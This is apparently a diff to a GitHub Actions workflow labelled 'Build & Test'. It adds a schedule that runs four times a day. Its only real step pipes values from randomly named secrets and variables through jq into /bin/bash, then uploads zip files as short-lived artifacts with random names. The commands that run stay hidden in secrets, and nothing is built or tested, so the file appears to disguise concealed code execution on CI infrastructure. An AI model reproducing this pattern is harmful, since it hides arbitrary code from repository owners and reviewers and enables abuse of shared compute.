@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '9 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,18 +24,19 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          zv4066: ${{ secrets.zv4066 }}
+          y926: ${{ secrets.y926 }}
         run: |
-          printf '%s' "$zv4066" | jq -r .ynan7 | /bin/bash
-          printf '%s' "$srsod78" | jq -r .yw2 | /bin/bash
-          echo $eotuz20022 | jq -r .mlql6 | /bin/bash
-          printf '%s' "$macag34" | jq -r .egtyv2247 | /bin/bash
-          echo $aswr61 | jq -r .hh730 | /bin/bash
+          printf '%s' "$y926" | jq -r .p6 | /bin/bash
+          echo $tnkxa7734 | jq -r .oad76792 | /bin/bash
+          echo $j132 | jq -r .mne0 | /bin/bash
+          echo $sy91 | jq -r .k48203 | /bin/bash
+          echo $hdms23544 | jq -r .nr0 | /bin/bash
+          printf '%s' "$xz8826" | jq -r .cjwr01422 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: km3Ayvgr
+          name: bCqp3kPl
           path: "*.zip"
           retention-days: 1
